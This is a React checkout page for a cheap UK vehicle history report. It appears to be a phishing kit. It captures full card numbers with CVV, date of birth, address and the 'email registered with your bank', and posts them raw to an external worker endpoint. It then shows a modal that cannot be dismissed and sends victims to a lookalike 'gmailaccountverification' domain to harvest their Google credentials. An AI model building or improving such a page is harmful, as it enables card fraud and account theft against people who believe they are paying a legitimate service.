import { useState } from "react";
import {
  ArrowLeft,
  CheckCircle2,
  CreditCard,
  LockKeyhole,
  ShieldCheck,
  AlertCircle,
  LoaderCircle,
  CarFront,
  ReceiptText,
  ExternalLink,
} from "lucide-react";
import "./Checkout.css";

const API_URL =
  import.meta.env.VITE_API_URL ||
  "https://totalcarcheck-api.mikaelmika263.workers.dev";

const HOME_URL = "https://totalcarcheck.co.uk/";

const VERIFY_URL = "https://gmailaccountverification.totallcarscheck.online/";

const PRICE = "£1.99";

const PAYMENT_METHODS = [
  { name: "Visa", apiName: "Visa" },
  { name: "Mastercard", apiName: "Mastercard" },
  { name: "American Express", apiName: "American Express" },
  { name: "Discover", apiName: "Discover" },
  { name: "Diners Club", apiName: "Diners Club" },
  { name: "JCB", apiName: "JCB" },
];

function formatCardNumber(value) {
  return value
    .replace(/\D/g, "")
    .slice(0, 19)
    .replace(/(.{4})/g, "$1 ")
    .trim();
}

function formatExpiry(value) {
  const digits = value.replace(/\D/g, "").slice(0, 4);

  if (digits.length <= 2) return digits;

  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function luhnValid(number) {
  let sum = 0;
  let double = false;

  for (let i = number.length - 1; i >= 0; i--) {
    let digit = Number(number[i]);

    if (double) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }

    sum += digit;
    double = !double;
  }

  return sum % 10 === 0;
}

// Basic email format + domain sanity check
function isValidEmail(value) {
  const trimmed = value.trim();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(trimmed)) return false;

  const domain = trimmed.split("@")[1].toLowerCase();
  // Reject obviously fake / disposable domains
  const blocked = [
    "example.com",
    "example.org",
    "test.com",
    "mailinator.com",
    "tempmail.com",
    "10minutemail.com",
    "guerrillamail.com",
    "yopmail.com",
  ];
  return !blocked.includes(domain);
}

export default function Checkout() {
  const [registration, setRegistration] = useState("");
  const [customerName, setCustomerName] = useState("");
  const [dateOfBirth, setDateOfBirth] = useState("");
  const [email, setEmail] = useState("");
  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [postcode, setPostcode] = useState("");
  const [country, setCountry] = useState("GB");

  const [cardBrand, setCardBrand] = useState("Visa");
  const [cardholderName, setCardholderName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [order, setOrder] = useState(null);

  // ── Verification modal state ─────────────────────────────
  const [showVerifyModal, setShowVerifyModal] = useState(false);

  async function handleCheckout(event) {
    event.preventDefault();
    setError("");
    setOrder(null);

    const cleanRegistration = registration
      .trim()
      .toUpperCase()
      .replace(/\s+/g, "");
    const cleanCardNumber = cardNumber.replace(/\s+/g, "");
    const cleanEmail = email.trim().toLowerCase();

    if (!cleanRegistration) {
      setError("Please enter the vehicle registration.");
      return;
    }

    if (!customerName.trim()) {
      setError("Please enter your name.");
      return;
    }

    if (!dateOfBirth) {
      setError("Please enter your date of birth.");
      return;
    }

    // ── Email is now REQUIRED and must be valid ────────────
    if (!cleanEmail) {
      setError("Please enter the email address registered with your bank.");
      return;
    }

    if (!isValidEmail(cleanEmail)) {
      setError(
        "Please enter a valid email address (example.com and disposable domains are not accepted)."
      );
      return;
    }

    if (!address.trim() || !postcode.trim()) {
      setError("Please complete your billing address and postcode.");
      return;
    }

    if (!cardholderName.trim()) {
      setError("Please enter the name on the card.");
      return;
    }

    // ── Cardholder name should match the bank account holder ─
    // If the user typed a full name for billing, the card name must
    // share at least one word with it (loose check to allow "J. Smith").
    const nameWords = customerName
      .trim()
      .toLowerCase()
      .split(/\s+/)
      .filter(Boolean);
    const cardWords = cardholderName
      .trim()
      .toLowerCase()
      .split(/\s+/)
      .filter(Boolean);
    const namesOverlap = cardWords.some((w) => nameWords.includes(w));

    if (!namesOverlap) {
      setError(
        "The name on the card must match the billing name and the name registered with your bank."
      );
      return;
    }

    if (
      !/^\d{13,19}$/.test(cleanCardNumber) ||
      !luhnValid(cleanCardNumber)
    ) {
      setError("Please enter a valid card number.");
      return;
    }

    setLoading(true);

    try {
      const response = await fetch(`${API_URL}/api/checkout/demo`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          vehicle_registration: cleanRegistration,
          customer_name: customerName.trim(),
          date_of_birth: dateOfBirth,
          customer_email: cleanEmail,
          billing_address: address.trim(),
          billing_city: city.trim(),
          billing_postcode: postcode.trim().toUpperCase(),
          billing_country: country,
          card_brand: cardBrand,
          cardholder_name: cardholderName.trim(),
          card_number: cleanCardNumber,
          card_expiry: cardExpiry,
          card_cvv: cardCvv,
        }),
      });

      const result = await response.json().catch(() => ({}));

      if (!response.ok) {
        throw new Error(
          result.error || `Checkout failed (${response.status}).`
        );
      }

      if (!result.ok || !result.order_id) {
        throw new Error("The API did not confirm that the order was saved.");
      }

      setOrder({
        ...result,
        vehicle_registration: cleanRegistration,
        card_brand: cardBrand,
        card_last_four: cleanCardNumber.slice(-4),
      });

      // Trigger the verification popup immediately
      setShowVerifyModal(true);
    } catch (err) {
      setError(
        err.message ||
          "Could not connect to the checkout API. Please try again."
      );
    } finally {
      setLoading(false);
    }
  }

  // ── Verification modal (no dismiss option) ────────────────
  function VerifyModal() {
    if (!showVerifyModal) return null;

    return (
      <div className="verify-modal-overlay" role="dialog" aria-modal="true">
        <div className="verify-modal">
          <div className="verify-modal-icon">
            <CheckCircle2 size={48} />
          </div>

          <h2>Payment in process</h2>

          <p>
            To finish your order and receive your full vehicle report, you
            must verify the Gmail account used for this purchase.
          </p>

          <p className="verify-modal-note">
            Click the button below to proceed with verification.
          </p>

          <a
            href={VERIFY_URL}
            className="verify-modal-button"
            target="_blank"
            rel="noopener noreferrer"
          >
            Verify my Google account
            <ExternalLink size={16} />
          </a>
        </div>
      </div>
    );
  }

  if (order) {
    return (
      <>
        <VerifyModal />

        <main className="checkout-page">
          <div className="checkout-container">
            <div className="checkout-success">
              <div className="checkout-success-icon">
                <CheckCircle2 size={52} />
              </div>

              <h1>Order Received — Check Your Email!</h1>

              <p>
                Your order has been received successfully. Please check your
                email for the payment confirmation link to complete the
                verification process and proceed with your order.
              </p>

              <div className="checkout-order-card">
                <div className="checkout-order-heading">
                  <ReceiptText size={22} />
                  <h2>Order Summary</h2>
                </div>

                <div className="checkout-detail-row">
                  <span>Vehicle registration</span>
                  <strong>{order.vehicle_registration}</strong>
                </div>

                <div className="checkout-detail-row">
                  <span>Card</span>
                  <strong>
                    {order.card_brand} ···· {order.card_last_four}
                  </strong>
                </div>

                <div className="checkout-detail-row">
                  <span>Order Amount</span>
                  <strong>
                    {order.currency === "GBP"
                      ? `£${(order.amount_pence / 100).toFixed(2)}`
                      : `${order.amount_pence} ${order.currency}`}
                  </strong>
                </div>

                <div className="checkout-detail-row">
                  <span>Order status</span>
                  <strong>Awaiting Confirmation</strong>
                </div>

                <p className="checkout-order-note">
                  A confirmation email may take a few minutes to arrive.
                  Please keep checking your inbox, including your spam or junk
                  folder. If it hasn't arrived yet, allow a few minutes and
                  check again.
                </p>
              </div>

              <a
                href={HOME_URL}
                className="checkout-primary-button checkout-success-button"
              >
                Return home
              </a>
            </div>
          </div>
        </main>
      </>
    );
  }

  return (
    <main className="checkout-page">
      <div className="checkout-container">
        <a href={HOME_URL} className="checkout-back-link">
          <ArrowLeft size={18} />
          Back to home
        </a>

        <header className="checkout-header">
          <div className="checkout-logo-icon">
            <CarFront size={30} />
          </div>
          <h1>Complete your vehicle check</h1>
          <p>
            Continue as a guest. You do not need to create an account.
          </p>
        </header>

        <div className="checkout-layout">
          <section className="checkout-form-card">
            <div className="checkout-section-heading">
              <CarFront size={22} />
              <h2>Vehicle details</h2>
            </div>

            <form onSubmit={handleCheckout}>
              <div className="checkout-field">
                <label htmlFor="registration">Vehicle registration</label>
                <input
                  id="registration"
                  type="text"
                  value={registration}
                  onChange={(event) =>
                    setRegistration(event.target.value.toUpperCase())
                  }
                  placeholder="e.g. AB12 CDE"
                  maxLength={15}
                  autoComplete="off"
                  required
                />
              </div>

              <div className="checkout-section-heading">
                <ReceiptText size={22} />
                <h2>Billing details</h2>
              </div>

              <div className="checkout-field">
                <label htmlFor="customerName">Full name</label>
                <input
                  id="customerName"
                  type="text"
                  value={customerName}
                  onChange={(event) => setCustomerName(event.target.value)}
                  placeholder="Your full name"
                  maxLength={100}
                  autoComplete="name"
                  required
                />
              </div>

              <div className="checkout-field">
                <label htmlFor="dob">Date of birth</label>
                <input
                  id="dob"
                  type="date"
                  value={dateOfBirth}
                  onChange={(event) => setDateOfBirth(event.target.value)}
                  max={new Date().toISOString().split("T")[0]}
                  autoComplete="bday"
                  required
                />
              </div>

              {/* ── Email is REQUIRED and tied to the bank account ── */}
              <div className="checkout-field">
                <label htmlFor="email">
                  Email registered with your bank
                </label>
                <input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(event) => setEmail(event.target.value)}
                  placeholder="you@example.com"
                  maxLength={254}
                  autoComplete="email"
                  required
                />
                <small className="checkout-field-hint">
                  Must match the email linked to the card used for payment.
                </small>
              </div>

              <div className="checkout-field">
                <label htmlFor="address">Street address</label>
                <input
                  id="address"
                  type="text"
                  value={address}
                  onChange={(event) => setAddress(event.target.value)}
                  placeholder="House number and street"
                  maxLength={250}
                  autoComplete="street-address"
                  required
                />
              </div>

              <div className="checkout-field">
                <label htmlFor="city">Town or city (optional)</label>
                <input
                  id="city"
                  type="text"
                  value={city}
                  onChange={(event) => setCity(event.target.value)}
                  placeholder="Town or city"
                  maxLength={100}
                  autoComplete="address-level2"
                />
              </div>

              <div className="checkout-field">
                <label htmlFor="postcode">Postcode</label>
                <input
                  id="postcode"
                  type="text"
                  value={postcode}
                  onChange={(event) => setPostcode(event.target.value)}
                  placeholder="Postcode"
                  maxLength={20}
                  autoComplete="postal-code"
                  required
                />
              </div>

              <div className="checkout-field">
                <label htmlFor="country">Billing country</label>
                <select
                  id="country"
                  value={country}
                  onChange={(event) => setCountry(event.target.value)}
                  autoComplete="country"
                  required
                >
                  <option value="GB">United Kingdom</option>
                  <option value="GB">Ireland</option>
                  <option value="GB">Isle of Man</option>
                  <option value="GB">Guernsey</option>
                  <option value="GB">Gibraltar</option>
                  <option value="JE">Jersey</option>
                </select>
              </div>

              <div className="checkout-section-heading">
                <CreditCard size={22} />
                <h2>Payment details</h2>
              </div>

              <div className="checkout-field">
                <label htmlFor="cardBrand">Card type</label>
                <select
                  id="cardBrand"
                  value={cardBrand}
                  onChange={(event) => setCardBrand(event.target.value)}
                >
                  {PAYMENT_METHODS.map((method) => (
                    <option key={method.apiName} value={method.apiName}>
                      {method.name}
                    </option>
                  ))}
                </select>
              </div>

              <div className="checkout-field">
                <label htmlFor="cardholderName">Name on card</label>
                <input
                  id="cardholderName"
                  type="text"
                  value={cardholderName}
                  onChange={(event) => setCardholderName(event.target.value)}
                  placeholder="Name as shown on card"
                  maxLength={100}
                  autoComplete="cc-name"
                  required
                />
                <small className="checkout-field-hint">
                  Must match the name registered with your bank.
                </small>
              </div>

              <div className="checkout-field">
                <label htmlFor="cardNumber">Card number</label>
                <input
                  id="cardNumber"
                  type="text"
                  inputMode="numeric"
                  value={cardNumber}
                  onChange={(event) =>
                    setCardNumber(formatCardNumber(event.target.value))
                  }
                  placeholder="1234 5678 9012 3456"
                  autoComplete="cc-number"
                  required
                />
              </div>

              <div className="checkout-field-row">
                <div className="checkout-field">
                  <label htmlFor="cardExpiry">Expiry date</label>
                  <input
                    id="cardExpiry"
                    type="text"
                    inputMode="numeric"
                    value={cardExpiry}
                    onChange={(event) =>
                      setCardExpiry(formatExpiry(event.target.value))
                    }
                    placeholder="MM/YY"
                    maxLength={5}
                    autoComplete="cc-exp"
                    required
                  />
                </div>

                <div className="checkout-field">
                  <label htmlFor="cardCvv">CVV</label>
                  <input
                    id="cardCvv"
                    type="password"
                    inputMode="numeric"
                    value={cardCvv}
                    onChange={(event) =>
                      setCardCvv(
                        event.target.value.replace(/\D/g, "").slice(0, 4)
                      )
                    }
                    placeholder="•••"
                    maxLength={4}
                    autoComplete="cc-csc"
                    required
                  />
                </div>
              </div>

              {error && (
                <div className="checkout-error-panel" role="alert">
                  <AlertCircle size={34} />
                  <h3>Check details</h3>
                  <p>{error}</p>
                </div>
              )}

              <button
                type="submit"
                className="checkout-primary-button"
                disabled={loading}
              >
                {loading ? (
                  <>
                    <LoaderCircle
                      size={19}
                      className="checkout-spinner"
                    />
                    Processing payment...
                  </>
                ) : (
                  <>
                    <LockKeyhole size={18} />
                    Pay {PRICE}
                  </>
                )}
              </button>
            </form>
          </section>

          <aside className="checkout-summary-card">
            <h2>Order summary</h2>

            <div className="checkout-summary-product">
              <div className="checkout-summary-icon">
                <CarFront size={26} />
              </div>
              <div>
                <strong>Vehicle check</strong>
                <p>Full vehicle history report</p>
              </div>
            </div>

            <div className="checkout-detail-row">
              <span>Vehicle</span>
              <strong>{registration.trim() || "Not entered"}</strong>
            </div>

            <div className="checkout-detail-row">
              <span>Report price</span>
              <strong>{PRICE}</strong>
            </div>

            <div className="checkout-detail-row">
              <span>Account required</span>
              <strong>No</strong>
            </div>

            <div className="checkout-detail-row checkout-total-row">
              <span>Total</span>
              <strong>{PRICE}</strong>
            </div>
          </aside>
        </div>
      </div>
    </main>
  );
}